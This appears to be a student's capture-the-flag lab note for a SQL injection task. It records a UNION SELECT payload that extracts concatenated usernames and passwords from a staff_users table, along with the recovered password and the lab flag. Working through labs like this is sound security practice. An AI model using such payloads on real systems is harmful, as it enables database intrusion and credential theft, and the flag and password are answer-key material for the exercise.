# Level One — Error-Based SQLi (Task 5)

**Date recorded:** 2025-09-23

**Payload used:**
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

markdown
Copy code

**Result / Notes:** Retrieved concatenated `username:password` values from `staff_users`.  
**Password recovered:** pa$$word  
**Flag obtained:** THM{SQL_INJECTION_3840}

**Screenshot:** ../screenshot/level1/l1-step1.png
